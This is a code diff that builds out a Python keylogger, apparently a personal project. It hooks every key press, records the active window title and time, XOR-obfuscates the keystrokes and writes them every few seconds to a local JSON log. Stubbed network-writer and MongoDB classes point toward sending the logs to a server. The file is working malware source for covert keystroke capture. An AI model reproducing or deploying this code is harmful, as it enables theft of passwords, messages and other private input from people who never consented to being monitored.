@@ -1,38 +1,116 @@
+import time
+from datetime import datetime
+import json
 import keyboard
+import pygetwindow as gw
+from abc import ABC, abstractmethod
+import threading
+from pymongo import MongoClient
 
-class KeyLogger:
+class KeyLoggerService:
 
     def __init__(self):
-        self.data = None
-        self.path = "log.txt"
-        self._listen = self.Listen()
+        self.data = {}
+        self._get_keyword()
 
-    class Listen:
+    def get_data(self):
+        data = self.data.copy()
+        self.data.clear()
+        return data
 
-        def __init__(self):
-            pass
+    def _get_keyword(self) -> None:
+        def callback(key):
 
-        def _get_keyword(self):
-            pass
+            active_window = self._get_window()
+            if active_window not in self.data:
+                self.data[active_window] = {}
 
-        def _get_active_window(self):
-            pass
+            current_time = self._get_time()
+            if current_time not in self.data[active_window]:
+                self.data[active_window][current_time] = ""
 
-        def _get_time(self):
-            pass
+            self.data[active_window][current_time] += key.name
 
+        keyboard.on_press(callback)
 
-    def _save_to_file(self):
+    def _get_window(self):
+        try:
+            return gw.getActiveWindow().title
+        except:
+            print("There  was an error to get the window!")
+
+    def _get_time(self):
+        return datetime.now().strftime("%Y-%Y-%m-%d %H:%M")
+
+class Writer(ABC):
+
+    @abstractmethod
+    def write(self, data):
         pass
 
-    def _upload_to_server(self):
+class FileWriter(Writer):
+
+    def write(self, data: dict) -> None:
+        try:
+            with open("log.json", "r") as file:
+                try:
+                    origin_data = json.load(file)
+                except json.JSONDecodeError:
+                    origin_data = {}  # If file is empty or invalid, start fresh
+        except FileNotFoundError:
+            origin_data = {}
+
+        origin_data.update(data)
+
+        with open("log.json", "w") as file:
+            json.dump(origin_data, file, indent=4)
+
+
+class NetworkWriter(Writer):
+
+    def write(self, data):
         pass
 
-    def _encrypt(self):
-        pass
+class Encryptor:
+    def __init__(self, key="a"):
+        self.key = key
 
-    def exit(self):
-        pass
+    def _encrypt(self, string):
+        return "".join([chr(ord(letter) ^ ord(self.key)) for letter in string])
 
+    def xor(self, data):
+        encrypted_data = {}
+        for key in data:
+            new_key = self._encrypt(key)
+            encrypted_data[new_key] = {self._encrypt(t): self._encrypt(data[key][t]) for t in data[key]}
+        return encrypted_data
 
-keylogger = KeyLogger()
+    def decrypt_data(self, data):
+        return self.xor(data)
+
+class KeyLoggerManager:
+
+    def __init__(self):
+        self.key_logger_service = KeyLoggerService()
+        self.file_writer = FileWriter()
+        self.network_writer = NetworkWriter()
+        self.encryptor = Encryptor()
+        self.key_logger_thread = threading.Thread(target=self.main)
+        self.key_logger_thread.start()
+
+    def main(self):
+        while True:
+            time.sleep(6)
+            data = self.key_logger_service.get_data()
+            encrypted_data = self.encryptor.xor(data)
+            self.file_writer.write(encrypted_data)
+
+def get_database():
+    CONNECTION_STRING = ""
+    client = MongoClient(CONNECTION_STRING)
+    return client
+
+keylogger = KeyLoggerManager()
+keyboard.wait()
+
+print("keylogger is starting!")
